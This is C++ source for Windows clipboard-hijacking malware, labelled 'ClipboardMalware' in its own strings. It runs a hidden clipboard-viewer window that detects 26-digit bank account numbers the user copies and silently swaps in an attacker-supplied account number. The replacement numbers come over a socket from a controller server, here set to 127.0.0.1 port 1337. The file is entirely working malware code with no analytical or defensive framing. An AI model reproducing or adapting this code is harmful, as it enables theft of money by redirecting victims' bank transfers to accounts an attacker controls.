#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <strsafe.h>

#define BANK_ACCOUNT_NUMBER_LENGTH 27 // 26 + \0
#define CLIENT_SOCKET_PROCESS "client_socket"
#define MY_WNDCLASSA "ClipboardMalwareClass"
#define MESSAGE_GOT_NEW_NUMBER (WM_USER+1)

int connectServer();
void clipboardManager();
LPPROCESS_INFORMATION startSocketProcess(char* exePath);
long FAR PASCAL WndProc(HWND hwnd, WORD message, WORD wParam, LONG lParam);
void createNewWindow();
void swapClipboard(HWND hwnd);
bool isAccountNumberInClipboard(char* clipboardText);
char bankAccountNumber[BANK_ACCOUNT_NUMBER_LENGTH];

int main(int argc, char* argv[])
{
	if (argc > 0 && strcmp(argv[0], CLIENT_SOCKET_PROCESS) == 0)
		ExitProcess(connectServer());
	createNewWindow();

	LPPROCESS_INFORMATION processInfo = startSocketProcess(argv[0]);
	if (processInfo == NULL)
		return -1;

	clipboardManager();


	WaitForSingleObject(processInfo->hProcess, INFINITE);
	CloseHandle(processInfo->hThread);
	CloseHandle(processInfo->hProcess);
	return 0;
}

void createNewWindow()
{
	char consoleTitle[20] = "ClipboardMalware";
	SetConsoleTitleA(consoleTitle);
	HWND hwndConsole = FindWindowA(NULL, consoleTitle);
	HINSTANCE hInstance = (HINSTANCE)GetWindowLong(hwndConsole, GWL_HINSTANCE);
	WNDCLASSA wndclass;
	HWND hwndNew;
	static char className[] = MY_WNDCLASSA;

	wndclass.style = 0;
	wndclass.lpfnWndProc = (WNDPROC)WndProc;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hInstance = hInstance;
	wndclass.hIcon = 0;
	wndclass.hCursor = NULL;
	wndclass.hbrBackground = NULL;
	wndclass.lpszMenuName = NULL;
	wndclass.lpszClassName = className;

	RegisterClassA(&wndclass);

	hwndNew = CreateWindowA(className, consoleTitle, WS_MINIMIZE,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);

	ShowWindow(hwndNew, SW_SHOWMINIMIZED);
	UpdateWindow(hwndNew);
}

LPPROCESS_INFORMATION startSocketProcess(char* exePath)
{
	STARTUPINFOA startupInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);

	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION;
	ZeroMemory(processInfo, sizeof(PROCESS_INFORMATION));

	std::string args = CLIENT_SOCKET_PROCESS;

	if (!CreateProcessA(exePath, (LPSTR)args.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, processInfo))
		return NULL;
	
	return processInfo;
}

long FAR PASCAL WndProc(HWND hwnd, WORD message, WORD wParam, LONG lParam)
{
	static HWND hwndNextWnd;
	HDC hdc;
	PAINTSTRUCT ps;
	COPYDATASTRUCT* receivedData = NULL;
	switch (message)
	{
	case WM_CREATE:
		hwndNextWnd = SetClipboardViewer(hwnd);
		return 0;
	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNextWnd);
		PostQuitMessage(0);
		return 0;
	case WM_CHANGECBCHAIN:
		if (hwndNextWnd == (HWND)wParam)
			hwndNextWnd = (HWND)lParam;
		else
			if (hwndNextWnd != NULL)
				SendMessageA(hwndNextWnd, message, wParam, lParam);
		return 0;
	case WM_DRAWCLIPBOARD:
		if (hwndNextWnd != NULL)
			SendMessage(hwndNextWnd, message, wParam, lParam);
		InvalidateRect(hwnd, NULL, TRUE);
		return 0;
	case WM_PAINT:
		hdc = BeginPaint(hwnd, &ps);
		swapClipboard(hwnd);
		EndPaint(hwnd, &ps);
		return 0;
	case WM_COPYDATA:
		receivedData = (COPYDATASTRUCT*)lParam;
		switch (receivedData->dwData)
		{
		case MESSAGE_GOT_NEW_NUMBER:
			strcpy_s(bankAccountNumber, (char*)(receivedData->lpData));
			break;
		}
		return 0;
	default:
		return DefWindowProcA(hwnd, message, wParam, lParam);
	}
}

void swapClipboard(HWND hwnd)
{
	bool swap = false;
	HANDLE handleMem = NULL;
	if (IsClipboardFormatAvailable(CF_TEXT))
	{
		OpenClipboard(hwnd);
		HANDLE clipboardHandle = GetClipboardData(CF_TEXT);
		if (clipboardHandle == NULL)
		{
			CloseClipboard();
			return;
		}
		LPVOID lpClipboard = GlobalLock(clipboardHandle);
		if (lpClipboard == NULL)
		{
			CloseClipboard();
			return;
		}
		swap = isAccountNumberInClipboard((char*)lpClipboard);
		GlobalUnlock(clipboardHandle);

		if (swap && (handleMem = GlobalAlloc(GHND, BANK_ACCOUNT_NUMBER_LENGTH)) != NULL)
		{
			LPVOID lpMem = GlobalLock(handleMem);
			// printf("changing on: %s\n", bankAccountNumber);
			memcpy(lpMem, bankAccountNumber, BANK_ACCOUNT_NUMBER_LENGTH - 1);
			GlobalUnlock(handleMem);
			EmptyClipboard();
			SetClipboardData(CF_TEXT, handleMem);
			GlobalFree(handleMem);
		}
		CloseClipboard();
	}
}

bool isAccountNumberInClipboard(char* clipboardText)
{
	// printf("in clipboard: %s\n", clipboardText);
	int length = 0;
	for (int i = 0; i < BANK_ACCOUNT_NUMBER_LENGTH - 1; i++)
	{
		if (clipboardText[i] < '0' || clipboardText[i] > '9')
			return false;
	}
	if (clipboardText[BANK_ACCOUNT_NUMBER_LENGTH - 1] != 0)
		return false;
	return true;
}

void clipboardManager()
{
	MSG msg;
	while (GetMessageA(&msg, (HWND)NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageA(&msg);
	}
}

int connectServer()
{
	HWND hwnd = FindWindowA(MY_WNDCLASSA, NULL);
	SOCKET connectionSocket;
	struct sockaddr_in connectionSocketData;
	WSADATA wsadata;
	WORD version = MAKEWORD(2, 0);
	int result = WSAStartup(version, &wsadata);
	if (result != 0)
		return -1;
	connectionSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (connectionSocket == INVALID_SOCKET)
		return -1;

	memset((void*)(&connectionSocketData), 0, sizeof(connectionSocketData));
	connectionSocketData.sin_family = AF_INET;
	connectionSocketData.sin_port = htons(1337);
	InetPton(AF_INET, _T("127.0.0.1"), &connectionSocketData.sin_addr.s_addr);

	// printf("Connection established...\n");
	while (true)
	{
		result = connect(connectionSocket, (struct sockaddr FAR*)(&connectionSocketData), sizeof(connectionSocketData));
		if (result == SOCKET_ERROR && WSAGetLastError() == WSAECONNREFUSED)
			continue; // server is not acitve
		else if (result == SOCKET_ERROR)
			return WSAGetLastError();

		// Connection established
		char buf[BANK_ACCOUNT_NUMBER_LENGTH];
		while (recv(connectionSocket, buf, BANK_ACCOUNT_NUMBER_LENGTH, 0) > 0)
		{
			COPYDATASTRUCT dataToSend = { 0 };
			dataToSend.dwData = MESSAGE_GOT_NEW_NUMBER;
			dataToSend.cbData = BANK_ACCOUNT_NUMBER_LENGTH;
			dataToSend.lpData = &buf;
			SendMessageA(hwnd, WM_COPYDATA, 0, (LPARAM)&dataToSend);
		}
		// Connection lost try to connect again
		closesocket(connectionSocket);
		connectionSocket = socket(AF_INET, SOCK_STREAM, 0);
		if (connectionSocket == INVALID_SOCKET)
			return -1;
	}
	WSACleanup();
	return 0;
}

